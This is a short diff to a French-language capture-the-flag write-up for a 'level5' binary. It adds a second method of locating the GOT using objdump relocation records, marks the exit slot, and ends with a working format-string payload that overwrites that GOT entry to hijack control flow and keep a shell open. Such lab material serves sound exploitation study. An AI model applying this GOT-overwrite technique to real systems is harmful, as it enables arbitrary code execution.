@@ -37,4 +37,23 @@ disas 0x080483d0
 # End of assembler dump.
 ```
 
+// Deuxième manière d'avoir le GOT:
+```
+objdump -R ./level5
+
+./level5:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049814 R_386_GLOB_DAT    __gmon_start__
+08049848 R_386_COPY        stdin
+08049824 R_386_JUMP_SLOT   printf
+08049828 R_386_JUMP_SLOT   _exit
+0804982c R_386_JUMP_SLOT   fgets
+08049830 R_386_JUMP_SLOT   system
+08049834 R_386_JUMP_SLOT   __gmon_start__
+08049838 R_386_JUMP_SLOT   exit # <---
+0804983c R_386_JUMP_SLOT   __libc_start_main
+```
+
 (python -c "print '\x38\x98\x04\x08' + '%134513824x' + '' + '%4\$n'"; cat) | ./level5
